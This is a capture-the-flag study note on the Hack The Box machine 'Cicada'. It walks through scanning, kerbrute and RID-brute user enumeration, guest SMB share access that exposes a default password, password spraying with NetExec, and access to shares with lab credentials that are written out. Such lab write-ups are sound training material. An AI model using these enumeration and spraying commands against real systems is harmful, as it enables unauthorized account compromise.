IP: 10.10.11.35
# Initial Scan
Nmap scan: `sudo nmap -sC -sV -T4 -oN versions.nmap 10.10.11.35`

The scan revealed that this is a Windows box. 
## First steps
These are the services we initially looked into.
- Kerberos (88)
- SMB (445)
- LDAP (389 (default) 636 (unencrypted))
## Initial SMB notes
- Vulnerable to SMBghost module in Metasploit (search smb 3.1.1)
# SMB Enumeration
## Kerberos notes
- Lamoreaux used Kerbrute to get valid usernames.
- `kerbrute userenum -d cicada.htb --dc 10.10.11.35 /usr/share/wordlists/SecLists/SecLists/Usernames/xato-net-10-million-usernames-dup.txt`
	- ADMINISTRATOR@cicada.htb
	- Administrator@cicada.htb
	- administrator@cicada.htb
	- GUEST@cicada.htb
	- Guest@cicada.htb
	- guest@cicada.htb
## Further SMB notes
Netexec:
![[Cicada-SMB-shares.png]]

`smbclient //10.10.11.35/HR -N`
![[Cicada-SMB-HR.png]]

Default password from the HR SMB share: 
>Cicada$M6Corpb*@Lp#nZp!8
- Now we're trying to find the username.
# Exploitation with Impacket
First, use `impacket-lookupsid` to find the username. 

Command: 
```bash
impacket-lookupsids -dc-ip <DC_IP> <domain>/<user>
```
- This command uses 

# IppSec's Exploitation Method
## Initial Scanning
### nmap scan:
```bash
sudo nmap -sC -sV -vv -oA nmap/cicada 10.10.11.35
```

## SMB
### NetExec SMB Share Enumeration
```bash
nxc smb 10.10.11.35 -u '.' -p '' --shares  # Using guest authentication
```
- Note: there's nothing special about the username he input. He's just using a random short username to perform guest authentication to get access to the shares.


Unique shares:
- DEV
- HR

We have read access on the HR share, so we'll check that out using SMBclient.
### SMBclient 
```bash
smbclient -U '.' //10.10.11.35/HR  # Logs in w/ a fictitious user
dir  # Lists the contents of the share
mget *  # Uses multi-get and the wildcard to download everything
```
- You can use the following command to ask SMBclient to try accessing the share with a null session. This has the same effect as the above command, but may work differently
	- `smbclient -N //10.10.11.35/HR`

We just downloaded 'Notice from HR.txt', which contains the organization's default password. However, we need to get a list of valid usernames before we can utilize it.

### NetExec User Enumeration
Since we can authenticate with the SMB share as a guest, we can perform RID brute-forcing, which brute-forces the remote identifiers (RIDs) for the users on the box. This will give us a list of valid usernames. 

Once again, we use NetExec (nxc) for this:
```bash
nxc smb 10.10.11.35 -u '.' -p '' --rid-brute
```
- `--rid-brute` brute-forces the remote identifiers (RIDs) for the users on the box.
- `--rid-brute` uses RPC's lookupsids feature

Paste output into a file (using vim) then do this in Normal Mode to turn your output into a wordlist of valid users:
```bash
:%g!/TypeUser/d  # deletes every line that doesn't contain "TypeUser"
:%s/.* CICADA\\//g  # deletes everything up to and including CICADA\
:%s/ .*//g  # deletes everything after a space
```
- Now you'll have a usable wordlist for password spraying

These command explanations were taken verbatim from Claude AI. I added to them a little.
#### Command 1: `:%g!/TypeUser/d`
- `:%` - Apply the command to the entire file (from first line to last)
- `g!` - The global command with the negation operator (`!`), which means "for all lines that do NOT match the pattern"
- `/TypeUser/` - The search pattern, looking for lines containing the string "TypeUser"
- `d` - The command to execute on matching lines (delete)

So together, this finds all lines that do NOT contain "TypeUser" and deletes them, effectively keeping only lines with "TypeUser".
#### Command 2: `:%s/.* CICADA\\//g`
- `:%` - Apply the command to the entire file
- `s` - Substitute command
- `/.* CICADA\\` - The search pattern:
    - `.*` - Matches any character (`.`) zero or more times (`*`)
    - `CICADA\\` - Matches a space followed by "CICADA" (the backslash is escaped)
- `//` - Empty replacement string (replacing with nothing) 
	- The replacement string goes between those two slashes, so we're replacing w/ nothing.
- `/g` - Global flag, which applies the substitution to all matches in each line.

This is how to use the vim substitute command: `s/stuffToFind/stuffToReplaceWith/`
- This will find and delete something using the substitute command: `s/something//`

This command deletes everything from the beginning of each line up to and including "CICADA" (including the backslash).
#### Command 3: `:%s/ .*//g`
- `:%` - Apply the command to the entire file
- `s` - Substitute command
- `/ .*/` - The search pattern:
    - - A space character
    - `.*` - Any character (`.`) zero or more times (`*`)
- `/` - Empty replacement string (replacing with nothing)
- `/g` - Global flag, to apply to all matches in each line

This command deletes the first space character and everything that follows it on each line, effectively keeping only the text before the first space.

### Password spraying with NetExec (nxc)
Use the user list you created along with the default password you discovered, like so:
```bash
nxc smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```
- This will reveal a user account that still has the default password.

At this point, we could run Bloodhound if we wanted to. However, we'll keep going with SMB for now and see what else we can find.
### Additional SMB Enumeration
Log in as that user using nxc and list their shares. Then, list the other SMB users:
```bash
nxc smb 10.10.11.35 -u username -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
nxc smb 10.10.11.35 -u username -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```
- Hopefully you've noticed the new user

We can't connect via SSH because the SSH port is closed.
### SMBclient, again
```bash
smbclient -U 'cicada/username' //10.10.11.35/DEV

# To pass in the password with the username, do this:
smbclient -U 'cicada/username%password' //10.10.11.35/DEV
```

### NetExec Enumeration
```bash
nxc smb 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
```
- We've now looked at the same set of SMB shares from three different accounts - Guest, David O, and Emily O. Each time we've gained new levels of privilege, but this is the first time we've gained write access to the SMB server. 
- Now that we have access to the C: drive, we can get the user flag (check Emily's desktop).




# TTPs
What did we learn?

List tactics or tools that you were unaware of or unfamiliar with before this. 

## NXC
[Welcome | NetExec](https://www.netexec.wiki/)
[HackTheBox - Cicada](https://www.youtube.com/watch?v=21Z_byocGhI)
